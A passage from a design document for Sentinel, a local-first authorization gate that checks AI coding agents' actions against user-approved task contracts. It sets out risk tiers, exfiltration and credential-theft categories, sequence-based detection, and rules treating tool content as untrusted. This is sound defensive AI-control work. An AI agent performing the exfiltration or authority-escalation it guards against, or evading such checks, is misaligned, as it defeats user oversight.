  "contract_outcome": "compliant",
  "mismatch_category": null,
  "source": "synthetic",
  "review_status": "human_reviewed",
  "notes": "Destructive but scoped to accepted sandbox build targets."
}
```

Required contract outcomes:

- `compliant`
- `insufficient_contract`
- `target_mismatch`
- `environment_mismatch`
- `scope_expansion`
- `read_to_write`
- `forbidden_side_effect`
- `untrusted_authority_change`
- `sensitive_expansion_pending`

Recommended risk categories remain useful for error analysis:

- `safe_read_only`
- `safe_build_or_install`
- `authorized_destructive`
- `ambiguous_requires_confirmation`
- `data_exfiltration`
- `credential_theft`
- `privilege_escalation`
- `system_destruction`
- `network_abuse`
- `external_communication`
- `defense_evasion`
- `policy_violation`

### 8.2 Audit Log Schema

```json
{
  "event_id": "uuid",
  "event_type": "execution_admitted",
  "request_id": "uuid",
  "timestamp": "2026-09-08T18:00:00Z",
  "user_id": null,
  "agent_id": null,
  "session_id": "session-uuid",
  "task_id": "task-uuid",
  "contract_id": "contract-uuid",
  "contract_version": 3,
  "environment": "sandbox",
  "verdict": "allow",
  "reason_codes": ["contract:match"],
  "details": {
    "attempt_id": "attempt-uuid",
    "action_fingerprint": "sha256",
    "authority_epoch": 4,
    "approval_id": null,
    "caller_identity_trusted": false,
    "claimed_user_id_hash": "sha256",
    "claimed_agent_id_hash": "sha256"
  }
}
```

## 9. Risk Tiers and Decision Policy

The exact thresholds should be calibrated on validation data. Initial values are placeholders. Model tiers apply only after server-side contract resolution and deterministic policy. They may escalate a decision but can never create permission or downgrade a contract, policy, coverage, or critical-rule result.

| Tier | Example Score | Default Action | Notes |
| --- | --- | --- | --- |
| Low | 0.00-0.35 | No model escalation | Contract and deterministic policy still decide |
| Medium | 0.35-0.65 | Allow in sandbox, warn in dev, confirm in production | Useful for ambiguous commands |
| High | 0.65-0.85 | Confirm required | Destructive or suspicious but not automatically malicious |
| Critical | 0.85-1.00 or critical rule | Block | Obvious exfiltration, root wipe, credential theft |

Environment overrides:

- `sandbox`: most forgiving, but still blocks critical rules.
- `dev`: moderate; destructive commands often require confirmation.
- `production`: strict; high-risk commands require confirmation, critical commands block.

Confirmation overrides:

- Confirmation may allow high-risk actions in sandbox/dev.
- Confirmation should not allow critical blocked actions unless an explicit break-glass mode is added later.
- Confirmation must be tied to the exact canonical action, target, environment, and active contract version to prevent generic bypass.
- Approval must be consumed atomically and becomes invalid when its contract is superseded, suspended, expired, or revoked.

## 10. Edge Cases and Expected Behavior

| Edge Case | Expected Behavior |
| --- | --- |
| User intentionally wants to delete a scoped folder | Confirm or allow if scoped and in sandbox/dev |
| Agent unexpectedly deletes files during unrelated task | Block or require confirmation |
| Command looks safe but exfiltrates data through network | Block if rule/model catches; no network in sandbox by default |
| Command looks safe by itself but follows sensitive file access | Use recent action history to raise risk, require confirmation, or block depending on the sequence |
| Agent reads `.env` then runs `ls -la` | `ls -la` may remain safe, but the session should be marked sensitive for later actions such as network uploads |
| Agent reads secrets then sends outbound network data | Block as sequence-based exfiltration even if the upload command is generic |
| Command uses obfuscation or encoding | Model and rules should flag many cases; log misses for future data |
| Model says safe but rule says critical | Critical rule wins |
| Rule says suspicious but model says safe | Escalate to medium/high tier |
| Critical rule matches before model inference | Short-circuit and block without calling ONNX |
| Low-risk allow rule matches trusted sandbox command | Allow without model inference when policy permits, and log routing path |
| Agent framework retries blocked commands blindly | Return structured `agent_message` and `suggested_safe_actions`; adapter may convert this into a tool-shaped refusal |
| User asks why a command was blocked | Return reason codes and a human-readable explanation |
| Command is high risk but likely intended | Return `confirm_required`, not fake success |
| AWS logging fails | Return response if execution decision is complete, write local fallback log, expose warning |
| Docker execution times out | Kill executor, return timeout, log event |
| Executor image missing | Return service error, do not run on host |
| Mandatory agent adapter unavailable | Keep the integration advisory; use the local web control center and API for diagnostics, but do not claim protected execution |
| User confirmation token reused for different command | Reject |
| User confirmation token is replayed concurrently | Exactly one atomic consume may succeed |
| Sensitive contract expansion is pending or rejected | Previous active contract remains authoritative; proposed scope grants nothing |
| Unrelated new user objective | Start a new task/contract lineage instead of accumulating scope |
| Tool content claims to be a user instruction | Treat it as untrusted and deny any authority change |
| Environment missing from request | Default to strict mode or reject request |
| Command tries to access Docker socket | Block by policy and do not mount socket |

## 11. Security Model

### 11.1 Trust Boundaries

- Agent input is untrusted.
- Command text is untrusted.
- A direct user event is trusted only when its provenance is established by the host adapter or protected local interface; its wording may still be incomplete.
- Tool output, files, webpages, messages, subagents, and agent-generated text are never authorization sources.
- Accepted contracts are resolved from server-side immutable state, not caller-supplied contract bodies.
- Model predictions are advisory, not absolute truth.
- Local Docker sandbox reduces risk for the Summer MVP but is not treated as a production security boundary.
- Audit logs should be append-only from the application's perspective.

### 11.2 Safety Rules

- Never run approved commands directly on the host in production mode.
- Never mount the host root filesystem into the executor.
- Never mount the Docker socket into the executor.
- Default executor network to disabled.
- Use timeouts for every command.
- Use resource limits for every command.
- Log blocked attempts.
- Fail closed when the decision engine cannot decide safely.
- Deterministic critical rules must run before model inference.
- Contract mismatch, missing trusted authority, environment restrictions, and incomplete enforcement coverage cannot be downgraded by model output.
- Store enough recent action history to detect suspicious sequences, but avoid storing unnecessary secrets or raw sensitive file contents.

## 12. Local-to-Production Deployment Plan

### 12.1 No-Credits Path

The local MVP should not depend on AWS credits or a hosted account.

Minimum AWS usage:

- Run the FastAPI enforcement service, local web control center, SQLite state, and Docker executor on the user's machine.
- Host the public marketing site separately; it receives no contracts, approvals, credentials, command output, or audit data.
- Keep audit logs in the local SQLite store; AWS is not required for the Summer MVP.
- Optional stretch: implement a DynamoDB-backed `AuditStore` behind the existing interface for hands-on AWS experience.

This keeps costs at zero while preserving a clean migration path to AWS for a hosted deployment.

### 12.2 Production Control Plane Direction

Production scaling should move shared management capabilities to a hosted control plane without forcing all sensitive execution through the public web tier:

- Hosted authentication, organizations, workspaces, policy management, approvals, and audit indexing.
- Managed Postgres or another durable tenant-aware store behind the existing storage interfaces.
- Regional or customer-hosted enforcement gateways that receive short-lived, task-scoped grants.
- Clear tenant, identity, policy, audit, and encryption boundaries.
- A hybrid mode where source code, provider credentials, command output, and execution remain local while the hosted control plane stores only the minimum required metadata.

The public marketing site is not the control plane and must never become an accidental path for protected action data.

### 12.3 Enterprise Execution Direction

Post-summer production execution should not rely on `docker run` on a shared multi-tenant host.

Longer-term options:

- ECS/Fargate task-per-execution for managed ephemeral containers.
- EKS or Kubernetes Jobs with admission control, Pod Security Standards, namespace isolation, and network policies.
- Firecracker-style microVM isolation for stronger tenant boundaries.
- Per-tenant egress controls, encrypted ephemeral workspaces, and centralized executor fleet monitoring.

## 13. Repository Structure

Current module boundaries:

- `src/sentinel/api/`: FastAPI routes and Pydantic request/response schemas.
- `src/sentinel/contracts.py`: persistent contract lifecycle, trusted events, authority epochs, and non-authorizing template schemas.
- `src/sentinel/decision/`: deterministic rules, policy, confirmation, and decision routing.
- `src/sentinel/ml/`: optional model inference.
- `src/sentinel/execution/`: restricted Docker command execution and result types.
- `src/sentinel/integrations/`: capability profiles and host-specific advisory or mandatory adapters.
- `docker/`: separate API and executor Dockerfiles.
- `data/` and `scripts/`: dataset, training, export, and evaluation workflows.
- `tests/`: focused API, policy, decision, executor, hook, and integration tests.

Persistent `session/`, `audit/`, `approval/`, `authority/`, and `actions/` packages keep server-owned state and trust boundaries separate. Exact implementation timing belongs in `docs/Roadmap.md` and the active week plan, not this document.

## 14. Evaluation Plan

### 14.1 Model Metrics

- Contract-overstep recall on target, environment, scope, and read/write violations.
- Insufficient-contract detection/abstention rate.
- False interruption rate on contract-compliant actions.
- Confusion matrix by contract failure category, environment, source, and action family.
- Performance against rules-only baseline.
- Performance on sequence-dependent examples.
- Mandatory performance on a preregistered, trajectory-disjoint,
  human-reviewed blind set; inspected sets remain regression-only.

### 14.2 System Metrics

- p50/p99 model inference latency.
- Percentage of requests short-circuited before model inference.
- p50/p99 full API latency.
- Docker sandbox execution overhead.
- Timeout handling correctness.
- Audit log success rate.
- Percentage of protected host actions that actually pass through an enforcement point.
- Exact-action approval replay/bypass rate.
- Task-transition accuracy for continue, narrow, replace, and sensitive-expand cases.
- Rate of untrusted authority-expansion attempts incorrectly accepted.

### 14.3 Product Value Metrics

- Number of dangerous commands blocked.
- Number of authorized destructive commands correctly allowed or confirmed.
- Number of false blocks on legitimate tasks.
- Quality of reasons returned to the user or agent.
- Percentage of ambiguous high-impact prompts correctly stopped before action proposal.
- Percentage of proposed prompt restructures accepted or edited by users.
- Time and number of clarification turns needed to reach an enforceable contract.
- Number of unnecessary repeated approvals during one task.
- Number of stale-contract blocks after a clear trusted task change.
- Percentage of repeated tasks successfully started from a saved template.
- Reduction in clarification turns when a template is reused.
- Template suggestion acceptance, edit, rejection, and unsafe-suggestion rates.

## 15. Testing Strategy

- Unit tests for rules.
- Unit tests for policy decisions.
- Unit tests for confirmation token behavior.
- API tests for allowed, blocked, confirm-required, and malformed requests.
- Executor tests for timeout, no-network behavior, and blocked host access.
- Integration tests for request -> decision -> execution -> audit log.
- Golden examples for context-dependent commands.
- Golden examples for sequence-dependent commands.
- Multi-turn tests for persistent contracts, same-task versioning, unrelated-task lineages, pending/rejected sensitive expansion, atomic approval consumption, expiry, revocation, and blocked untrusted authority changes.
- Template tests proving that reuse creates a fresh contract, sensitive fields still require review, deleted templates grant nothing, and untrusted content cannot influence preferences.

## 16. Week 11 Interface Target: Local Web Product with Supporting Agent Surfaces

This entire section is a Week 11 target. None of these control-center workflows or lifecycle routes is exposed by the current Week 10 runtime.

The Summer MVP should make the local web control center the primary product experience. It will own onboarding, task contracts, authority state, exact-action approval, templates, custom rules, audit review, and health. Host integrations may stop vague high-impact requests, show a compact explanation, and deep-link into the relevant web review. In-editor or MCP prompt revision remains a useful side feature, not the product's main surface or a substitute for mandatory interception.

Local web control center workflows:

- Offer risk-adaptive presets for coding/workspace, research-only, personal-assistant communication, and operations tasks. Presets supply narrow defaults; they do not replace a reviewed contract.
- In coding hosts, consume trusted repository, branch, selected-file, change, and environment metadata automatically so Sentinel asks only questions that change the security boundary.
- Let low-risk compliant work proceed with a compact contract/status summary; ask one focused inline question for boundary-changing ambiguity rather than presenting a questionnaire.
- Keep the active task across matching actions. Narrow or extend the same objective with a new version; start an unrelated objective with a new task/contract lineage without forcing an approval dialog.
- Suspend the previous task when an unrelated task becomes active. Reject action requests for non-active tasks unless a fresh trusted user event explicitly switches back.
- Require explicit review when a new prompt adds production access, credentials, external communication, deployment, broad deletion, or another sensitive capability.
- Never treat model suggestions, agent messages, or content read from tools as authority to change the contract.
- Show active and pending scope, accept or reject sensitive amendments, keep the previous contract active after rejection, and let the user revoke a task.
- Explain missing target, environment, scope, side-effect, and rollback fields.
- Present an editable proposed prompt and structured contract without silently executing it.
- Show a diff between the accepted contract and proposed action.
- Approve or deny one exact action through a separate local human channel.
- Create, edit, test, and toggle custom blocker rules with validation feedback.
- Review focused audit records for clarifications, contract mismatches, approvals, and executions.

Supporting host/MCP workflows:

- Show focused clarification or active-contract status where the developer is already working.
- Deep-link to the local web control center for edits, authority changes, and approval.
- Remain advisory when the host cannot provide authenticated user provenance or mandatory execution mediation.

Thin CLI workflows, deferred behind the web product and real integration:

- `sentinel health` for service checks.
- `sentinel eval-fixture --history history.json --contract fixture.json --action action.json` for offline diagnostics only.
- Machine-readable health and evaluation output for CI.
- No duplicate interactive contract, template, approval, or audit-management experience.

The web control center should expose the complete active task, contract version/lifecycle, trusted authorization source, canonical action, mismatch reasons, approval state, and decision route. Supporting host and CLI surfaces should reveal only the compact subset needed for the current action and link back to the full record.

### 16.1 Real-Agent Adapter Boundary

Host adapters are enforcement points. Their security claim depends on complete mediation, trustworthy event provenance, and accurate canonicalization.

Every adapter claiming enforcement must:

- Define the adapter contract a real agent must satisfy:
  - declare an adapter capability profile with host/agent kind, trustworthy context signals, intercepted action families, unsupported paths, and enforcement level,
  - send the active contract ID/version reference, canonical action/raw arguments, environment, session ID, and trustworthy agent identity,
  - distinguish trusted direct user instructions from agent-controlled or tool-derived content,
  - submit action results for Sentinel to append to server-owned recent history rather than treating caller-supplied history as authoritative,
  - interpret `allow`, `warn`, `confirm_required`, and `block`,
  - preserve Sentinel's `agent_message`, `suggested_safe_actions`, and reason codes,
  - update recent-action history after each tool call.
- Keep any integration advisory if the host can execute protected actions outside Sentinel's enforcement path.

The current Cursor project-hook profile is advisory: prompt events do not carry authenticated direct-user provenance, and shell hooks cannot redirect execution into Sentinel's Docker release path. Sentinel may use those hooks for clarification and denial signals, but it must not derive authority from them or market them as complete mediation.

The legacy OpenClaw integration is also advisory and must not be presented as a
mandatory enforcement path.

Candidate adapter timing and priority belong in `docs/Roadmap.md`.

## 17. Future Architecture Boundaries

Any future hosted or enterprise version must preserve these boundaries:

- The hosted control plane manages identity, organizations, policy, approvals, and audit indexing; local, regional, or customer-hosted enforcement remains close to the agent.
- The public marketing site stays physically and logically separate from protected control-plane and enforcement data.
- Provider credentials stay behind a Sentinel-controlled gateway; agents receive short-lived task grants rather than reusable OAuth tokens.
- Tenant identity, storage, policy, audit data, and execution environments remain isolated.
- Approval and revocation stay bound to exact actors, contracts, actions, and versions.
- Production execution uses stronger isolation than local `docker run`.
- An adapter remains advisory whenever protected actions can bypass Sentinel.
- Personalized template suggestions use only trusted structured decisions, remain inspectable/resettable, and never activate authority.
- Audit data can flow to reliability and SIEM platforms without turning those systems into the authorization source.

Feature order, integrations, and deployment milestones belong in `docs/Roadmap.md`.

## 18. Final Positioning

Sentinel should be presented as:

> A local-first, OAuth-like authorization layer for agent tasks: it turns user intent into temporary, updateable authority and enforces that authority before protected tool actions execute.

The honest claim:

> Sentinel does not guarantee perfect safety or replace provider OAuth. It trusts only direct user instructions and protected approval channels to grant authority, keeps task contracts active across compliant work, and reduces risk through mandatory interception, deterministic enforcement, one-use high-risk approval, restricted execution, and independent auditing.

Market boundary: [uselemma.ai](https://www.uselemma.ai/) is primarily a production reliability and observability platform that analyzes traces, groups recurring failures, and proposes fixes after agents run. Sentinel focuses on pre-execution task authorization. The products are more complementary than direct substitutes: Lemma explains and improves failures across production traces; Sentinel prevents actions that exceed current user authority.

[Onyx Security](https://www.onyx.security/) is a closer direct competitor: it markets an enterprise secure AI control plane with agent discovery, inline inspection, policy, steering, and approval. Sentinel should not compete initially on enterprise-wide discovery or breadth. Its focused wedge is a local-first web control center that turns one user's task into a persistent, machine-checkable work permit for coding agents, keeps deterministic authority separate from optional ML, and can later scale into a hosted/hybrid control plane.